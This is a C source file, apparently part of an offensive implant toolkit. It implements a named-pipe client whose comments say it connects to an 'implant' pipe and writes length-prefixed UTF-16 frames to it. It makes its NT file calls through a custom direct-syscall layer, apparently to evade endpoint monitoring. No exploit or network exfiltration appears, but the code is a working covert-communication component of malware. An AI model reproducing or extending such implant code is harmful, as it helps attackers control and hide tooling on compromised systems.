#include "pipe.h"
#include "config.h"
#include "syscall.h"
#include "nt.h"

static BOOL g_ClientReady = FALSE;

static void PipeInitUnicode(PUNICODE_STRING us, PWSTR buffer, const WCHAR* value) {
    us->Length = (USHORT)(wcslen(value) * sizeof(WCHAR));
    us->MaximumLength = us->Length + sizeof(WCHAR);
    us->Buffer = buffer;
    memcpy(buffer, value, us->MaximumLength);
}

// NtWriteFile might not drain everything in one go
static BOOL PipeWriteAll(HANDLE handle, const void* data, ULONG byteLen) {
    IO_STATUS_BLOCK iosb = { 0 };
    NTSTATUS status;
    ULONG sent = 0;
    const BYTE* p = (const BYTE*)data;

    while (sent < byteLen) {
        ULONG chunk = byteLen - sent;
        status = SysNtWriteFile(
            handle, NULL, NULL, NULL, &iosb,
            (PVOID)(p + sent), chunk, NULL, NULL);

        if (!NT_SUCCESS(status))
            return FALSE;

        sent += (ULONG)iosb.Information;
    }

    return TRUE;
}

BOOL PipeClientInit(void) {
    if (g_ClientReady)
        return TRUE;
    g_ClientReady = SysInit();
    return g_ClientReady;
}

void PipeClientShutdown(void) {
    g_ClientReady = FALSE;
    SysShutdown();
}

// connect to implant pipe, write one frame, bail — no persistent handle
BOOL PipeClientSend(const WCHAR* text) {
    HANDLE pipe = NULL;
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING name = { 0 };
    WCHAR nameBuf[128] = { 0 };
    IO_STATUS_BLOCK iosb = { 0 };
    NTSTATUS status = (NTSTATUS)0xC0000001L;
    ULONG byteLen;
    ULONG frameLen;
    BYTE frame[PIPE_MAX_FRAME_BYTES] = { 0 };

    if (!g_ClientReady && !PipeClientInit())
        return FALSE;

    if (!text || text[0] == L'\0')
        return FALSE;

    byteLen = (ULONG)(wcslen(text) * sizeof(WCHAR));
    if (byteLen == 0 || byteLen > PIPE_MAX_ENTRY_BYTES)
        return FALSE;

    // wire format: [4 byte len][utf16 payload]
    frameLen = sizeof(ULONG) + byteLen;
    if (frameLen > sizeof(frame))
        return FALSE;

    *(ULONG*)frame = byteLen;
    memcpy(frame + sizeof(ULONG), text, byteLen);

    PipeInitUnicode(&name, nameBuf, PIPE_NT_PATH);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // implant might not be listening yet — retry a few times if pipe busy
    for (int attempt = 0; attempt < 5; attempt++) {
        status = SysNtCreateFile(
            &pipe,
            FILE_WRITE_DATA | SYNCHRONIZE,
            &oa,
            &iosb,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);

        if (NT_SUCCESS(status))
            break;

        if (status == STATUS_PIPE_BUSY) {
            Sleep(40);
            continue;
        }

        return FALSE;
    }

    if (!NT_SUCCESS(status) || !pipe)
        return FALSE;

    BOOL ok = PipeWriteAll(pipe, frame, frameLen);
    SysNtClose(pipe);
    return ok;
}
